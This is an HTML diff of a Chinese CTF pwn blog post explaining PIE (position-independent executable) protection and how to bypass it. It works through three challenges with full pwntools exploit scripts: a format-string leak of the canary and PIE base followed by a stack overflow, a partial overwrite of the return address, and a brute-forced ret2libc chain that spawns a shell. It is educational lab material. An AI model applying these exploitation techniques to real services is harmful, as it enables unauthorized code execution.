@@ -1,0 +1,833 @@
+<!DOCTYPE html>
+<html lang="zh-CH">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="downbeat">
+    
+    <meta name="author" content="D0wnBe@t">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://downbeat.top/2024/08/31/pie保护/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="PIE保护前言：参考：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;12809?time__1311&#x3D;GqGxuDcD2Dg0YGN4WxUxYq%2BW5q5Mf%2BbD#toc-0  pie保护简单来说就是程序每次载入内存的地址都会发生变化，地址是随机的  从ida来看，地址基本都是四位数，如下：    差别还是很明显的，因此我们不能直接利用这些地址操作，要先寻找到pie的基地址，ida给">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PIE保护">
+<meta property="og:url" content="http://downbeat.top/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/index.html">
+<meta property="og:site_name" content="D0wnBe@t">
+<meta property="og:description" content="PIE保护前言：参考：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;12809?time__1311&#x3D;GqGxuDcD2Dg0YGN4WxUxYq%2BW5q5Mf%2BbD#toc-0  pie保护简单来说就是程序每次载入内存的地址都会发生变化，地址是随机的  从ida来看，地址基本都是四位数，如下：    差别还是很明显的，因此我们不能直接利用这些地址操作，要先寻找到pie的基地址，ida给">
+<meta property="og:locale" content="zh_CH">
+<meta property="og:image" content="http://downbeat.top/PIE%E4%BF%9D%E6%8A%A4/ida%E7%9C%8Bpie.bmp">
+<meta property="og:image" content="http://downbeat.top/PIE%E4%BF%9D%E6%8A%A4/checksec.bmp">
+<meta property="og:image" content="http://downbeat.top/PIE%E4%BF%9D%E6%8A%A4/%E4%B8%BB%E5%87%BD%E6%95%B0.bmp">
+<meta property="og:image" content="http://downbeat.top/PIE%E4%BF%9D%E6%8A%A4/gdb%E6%89%BE%E5%81%8F%E7%A7%BB.bmp">
+<meta property="og:image" content="http://downbeat.top/PIE%E4%BF%9D%E6%8A%A4/ROPgadget.bmp">
+<meta property="og:image" content="http://downbeat.top/PIE%E4%BF%9D%E6%8A%A4/pie2-1.bmp">
+<meta property="og:image" content="http://downbeat.top/PIE%E4%BF%9D%E6%8A%A4/pie2-2.bmp">
+<meta property="og:image" content="http://downbeat.top/PIE%E4%BF%9D%E6%8A%A4/pie2-3.bmp">
+<meta property="og:image" content="http://downbeat.top/PIE%E4%BF%9D%E6%8A%A4/3-1.bmp">
+<meta property="og:image" content="http://downbeat.top/PIE%E4%BF%9D%E6%8A%A4/3-2.bmp">
+<meta property="article:published_time" content="2024-08-31T05:06:09.000Z">
+<meta property="article:modified_time" content="2024-09-16T12:40:35.806Z">
+<meta property="article:author" content="downbeat">
+<meta property="article:tag" content="ctf-pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://downbeat.top/PIE%E4%BF%9D%E6%8A%A4/ida%E7%9C%8Bpie.bmp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/favicon.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/favicon.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            PIE保护 | D0wnBe@t
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"downbeat.top","root":"/","language":"zh-CH","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"300px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/index_img2.jpg","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Dream of Full Stack","subtitle":{"text":["keep going"],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container flex flex-col justify-between min-h-dvh">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                D0wnBe@t
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">32</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">PIE保护</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">D0wnBe@t</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-08-31 13:06:09</span>
+        <span class="mobile">2024-08-31 13:06:09</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-09-16 20:40:35</span>
+            <span class="mobile">2024-09-16 20:40:35</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/ctf-pwn/">ctf-pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.5k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>6 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="PIE保护"><a href="#PIE保护" class="headerlink" title="PIE保护"></a>PIE保护</h1><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>参考：<a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12809?time__1311=GqGxuDcD2Dg0YGN4WxUxYq+W5q5Mf+bD#toc-0">https://xz.aliyun.com/t/12809?time__1311=GqGxuDcD2Dg0YGN4WxUxYq%2BW5q5Mf%2BbD#toc-0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><font size="4" color="red">pie保护简单来说就是程序每次载入内存的地址都会发生变化，地址是随机的</font></p>
+<ul>
+<li>从ida来看，地址基本都是<strong>四位数</strong>，如下：</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/ida%E7%9C%8Bpie.bmp"></p>
+<ul>
+<li>差别还是很明显的，因此我们不能直接利用这些地址操作，要先寻找到pie的基地址，ida给出来的只是偏移地址。</li>
+</ul>
+<p><font size="4" color="red">程序的实际运行地址 &#x3D; 程序加载基址 + 程序偏移地址</font></p>
+<ul>
+<li><fron color="red">注意：即使开启了pie，真实地址和ida中所看到的偏移地址的末三位数字肯定还是一样的，这是由于内存页对其的原理。</fron></li>
+</ul>
+<h3 id="关于开启pie的gdb调试"><a href="#关于开启pie的gdb调试" class="headerlink" title="关于开启pie的gdb调试"></a>关于开启pie的gdb调试</h3><ul>
+<li><strong>指令</strong>：</li>
+</ul>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *$rebase(偏移地址) <span class="comment"># 偏移地址从ida看</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>注意程序要先run起来，才可以打断点</li>
+</ul>
+<h3 id="具体题目"><a href="#具体题目" class="headerlink" title="具体题目"></a>具体题目</h3><h3 id="1-深育杯-2021-find-flag-格式化字符串-pie"><a href="#1-深育杯-2021-find-flag-格式化字符串-pie" class="headerlink" title="1.[深育杯 2021]find_flag(格式化字符串-pie)"></a>1.<strong>[深育杯 2021]find_flag</strong>(格式化字符串-pie)</h3><p><a class="link" target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/774">题目地址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/checksec.bmp"></p>
+<ul>
+<li><strong>保护全开直接看ida</strong></li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/%E4%B8%BB%E5%87%BD%E6%95%B0.bmp"></p>
+<ul>
+<li><strong>很明显的格式化字符串漏洞，先泄露canary和pie基地址，然后栈溢出到后门函数就可以了</strong> (此题有后门函数)</li>
+</ul>
+<p><font size="5" color="red"><strong>gdb调试查找泄露偏移</strong></font></p>
+<ul>
+<li>在格式化字符串漏洞那里下断点：</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/gdb%E6%89%BE%E5%81%8F%E7%A7%BB.bmp"></p>
+<ul>
+<li>先让程序start，然后如上面下断点，查看栈结构</li>
+<li><strong>rbp上方的就是canary</strong>, 距离rsp偏移是11，看最左侧也可以看出来，0xb，再加上6个寄存器(64位),偏移地址是17</li>
+<li>如何泄露pie地址，我们要得到一个<strong>既可以在ida中可以查看偏移的地址，也可以泄露出其真实地址的地方</strong>， 正如下方,偏移位0x146f的地方,泄露这个地方的地址，减去0x146f，就可以得到pie的基地址了。</li>
+<li><font color="red">注意：ROPgadget看到的地址也只是偏移地址，要加上pie的基地址后才可以使用：</font></li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/ROPgadget.bmp"></p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28406</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 格式化字符串泄露canary和pie基地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hi! What&#x27;s your name? &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%17$p-%19$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Nice to meet you, &quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;-&#x27;</span>)</span><br><span class="line">pie_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x146F</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+]canary = <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+]pie_base = <span class="subst">&#123;<span class="built_in">hex</span>(pie_base)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈溢出getflag</span></span><br><span class="line">getflag = pie_base + <span class="number">0x01231</span></span><br><span class="line">ret = pie_base + <span class="number">0x000000000000101a</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Anything else? &quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x38</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(ret) + p64(getflag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h6 id><a href="#" class="headerlink" title></a></h6><h3 id="2-linkctf-2018-7-babypie"><a href="#2-linkctf-2018-7-babypie" class="headerlink" title="2.linkctf_2018.7_babypie"></a>2.linkctf_2018.7_babypie</h3><p><a class="link" target="_blank" rel="noopener" href="https://buuoj.cn/challenges#linkctf_2018.7_babypie">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/pie2-1.bmp"></p>
+<ul>
+<li><strong>通过printf遇到\x00才会停止输出的特性，从而泄露canary</strong></li>
+<li><font color="red">但是此时无法泄露出pie的基地址了，那么我们就无法修改ret_address了吗？其实不然</font></li>
+</ul>
+<p>之前说过，由于页对其的机制，即使开启了pie，其末三位16进制数字也是一样的，正是因为这个，**所以返回地址和后门函数的地址应该只有末四位不同(运气最差的情况下)**，所以我们只需要修改末四位就可以ret到后门函数，从而getshell。</p>
+<ul>
+<li>此题目就是如此，但是只需要修改末两位就可以getshell</li>
+</ul>
+<p><font size="4"><strong>gdb 调试，画框部分其实就是main函数结束后的返回地址，发现偏移是0xa6a</strong></font></p>
+<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/pie2-2.bmp"></p>
+<p><strong><font size="4">ida中system(“&#x2F;bin&#x2F;sh”)的地址偏移是0xa42，只有后两位不同，修改后两位即可</font></strong></p>
+<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/pie2-3.bmp"></p>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26786</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x25</span>+<span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Name:\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+]canary = <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell = 0x00A3E</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + <span class="string">b&#x27;\x42&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p>如果有多位不同，而我们又只能逐字节更改，有时就需要自己写脚本爆破了</p>
+<h3 id="3-Basectf-week3-PIE-爆破返回地址"><a href="#3-Basectf-week3-PIE-爆破返回地址" class="headerlink" title="3.Basectf-week3-PIE(爆破返回地址)"></a>3.Basectf-week3-PIE(爆破返回地址)</h3><p><a class="link" target="_blank" rel="noopener" href="https://www.basectf.fun/">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/3-1.bmp"></p>
+<ul>
+<li>发现主函数就这些，什么都没有，所以我们要泄露libc，获得system函数,所需的gadget。</li>
+<li>但是我们无法像基本的ret2libc一样ret到main函数，那么如何修改呢？看下面的调试：</li>
+</ul>
+<h4 id="gdb调试："><a href="#gdb调试：" class="headerlink" title="gdb调试："></a>gdb调试：</h4><h5 id="1-填满栈空间，查看ret-address"><a href="#1-填满栈空间，查看ret-address" class="headerlink" title="1.填满栈空间，查看ret_address"></a>1.填满栈空间，查看ret_address</h5><p><img lazyload src="/images/loading.svg" data-src="/PIE%E4%BF%9D%E6%8A%A4/3-2.bmp"></p>
+<ul>
+<li>如图，返回地址是__libc_start_main+128，按照之前的方法来说，这里应该是一个pie+偏移的地址，我们修改末两字节就可以返回到main函数，然后通过泄露的地址计算出pie基地址，进行其他操作。</li>
+<li>但是这里不是，但是难道就不行了吗？其实不然，__libc_start_main函数附近也有gadget可以使我们返回main函数，可以自己用telescope去慢慢找，但是也可以直接爆破。</li>
+<li>其实你要知道，这题目肯定是修改末字节可以返回main函数的，不然就写不出来了。</li>
+</ul>
+<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换为 process 或 remote</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;challenge.basectf.fun&quot;, 20961)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):  <span class="comment"># 0x00 到 0xff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Trying p8 value: <span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span>&#x27;</span>)</span><br><span class="line">    p = process(<span class="string">&quot;./pwn&quot;</span>)  <span class="comment"># 每次循环都需要重新创建进程</span></span><br><span class="line">    payload = cyclic(<span class="number">0x100</span> + <span class="number">8</span>) + p8(i)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = p.recvuntil(<span class="string">&quot;you said &quot;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(p.recv())</span><br><span class="line">        <span class="keyword">if</span> response:</span><br><span class="line">            libc_start_main = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - i + <span class="number">0xc0</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+][+] Correct p8 value: <span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+][+] libc_start_main: <span class="subst">&#123;<span class="built_in">hex</span>(libc_start_main)&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="comment"># 后续的攻击逻辑</span></span><br><span class="line">            base = libc_start_main - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">            system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">            bin_sh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">            pop_rdi_ret = base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">            ret = base + <span class="number">0x0000000000029139</span></span><br><span class="line"></span><br><span class="line">            payload = cyclic(<span class="number">0x108</span>) + p64(pop_rdi_ret) + p64(bin_sh) + p64(ret) + p64(system)</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            p.interactive()</span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># 找到正确的值后退出循环</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;p8 value <span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span> failed.&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>效果：在出现输出停止的时候就说明那个数字是有效的，因为此时你已经远程控制服务器了，等待着你输出指令。</li>
+<li>0xc0对应的是__libc_start_main的地址。</li>
+<li>题目中没有相应的gadget,但是libc.so文件里面也有gadget，通过libc_base+偏移也可以使用</li>
+</ul>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> PIE保护</li>
+        <li><strong>Author:</strong> D0wnBe@t</li>
+        <li><strong>Created at
+                :</strong> 2024-08-31 13:06:09</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-09-16 20:40:35
+            </li>
+        
+        <li>
+            <strong>Link:</strong> http://downbeat.top/2024/08/31/PIE保护/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
